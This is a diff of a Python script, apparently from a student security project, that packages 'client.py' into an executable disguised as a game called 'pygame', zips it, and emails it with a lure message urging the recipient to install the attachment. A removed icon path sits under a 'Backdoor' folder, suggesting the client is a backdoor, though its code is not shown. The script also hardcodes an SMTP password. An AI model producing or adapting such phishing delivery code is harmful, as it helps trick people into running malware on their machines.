@@ -1,6 +1,8 @@
 import os
 import smtplib
 import zipfile
+from email.mime.image import MIMEImage
+
 import PyInstaller.__main__
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -10,7 +12,12 @@ from os.path import basename
 
 
 mail_content = '''Hello,
-This is a test mail using Python SMTP library.
+
+You can become a PyGAME MASTER without ever leaving the house! 
+Please, install it using the attached file!
+
+Happy HUNTING!
+PyGAME Team
 '''
 
 """The mail addresses and password; sender_address is fake
@@ -20,22 +27,55 @@ sender_pass = 'pygame367emagyp'
 receiver_address = 'maria-magdalena.barbieru@student.tuiasi.ro'
 
 message = MIMEMultipart()
-attach_file_name = 'client.zip'
+attach_file_name = 'pygame.zip'
+
+
+def zip_directory(path, ziph):
+    """Function used to archive files in a specific directory"""
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            ziph.write(os.path.join(root, file),
+                       os.path.relpath(os.path.join(root, file),
+                                       os.path.join(path, '..')))
+
+
+def create_executable():
+    """Function used to create the executable and archive it along with its dependencies through zipfile"""
+    PyInstaller.__main__.run([
+        'client.py',
+        '--onefile',
+        '-n=pygame'
+    ])
+
+    zipf = zipfile.ZipFile('pygame.zip', 'w', zipfile.ZIP_DEFLATED)
+    zip_directory('dist', zipf)
+    zipf.close()
 
 
 def setup_mime():
-    """Function used to setup the MIME
+    """Function used to setup the sender, receiver
     """
     message['From'] = sender_address
     message['To'] = receiver_address
 
     """The subject line"""
-    message['Subject'] = 'A mail sent by Python'
+    message['Subject'] = 'PyGAME - the new game that will fascinate the world'
 
 
 def setup_email_body():
     """Function used to build the body and the attachments for the mail"""
     message.attach(MIMEText(mail_content, 'plain'))
+
+    text = MIMEText('<img src="cid:image1">', 'html')
+    message.attach(text)
+
+    image = MIMEImage(open('/home/magda/Downloads/game.png', 'rb').read())
+
+    """Define the image's ID as referenced in the HTML body above
+    """
+
+    image.add_header('Content-ID', '<image1>')
+    message.attach(image)
 
     """Open the file as binary mode
     """
@@ -67,28 +107,6 @@ def send_email():
     session.sendmail(sender_address, receiver_address, text)
     session.quit()
     print('Mail Sent')
-
-
-def zip_directory(path, ziph):
-    """Function used to archive files in a specific directory"""
-    for root, dirs, files in os.walk(path):
-        for file in files:
-            ziph.write(os.path.join(root, file),
-                       os.path.relpath(os.path.join(root, file),
-                                       os.path.join(path, '..')))
-
-
-def create_executable():
-    """Function used to create the executable and archive it along with its dependencies through zipfile"""
-    PyInstaller.__main__.run([
-        'client.py',
-        '--onefile',
-        '--icon=/home/magda/Backdoor/game.ico'
-    ])
-
-    zipf = zipfile.ZipFile('client.zip', 'w', zipfile.ZIP_DEFLATED)
-    zip_directory('dist', zipf)
-    zipf.close()
 
 
 if __name__ == "__main__":
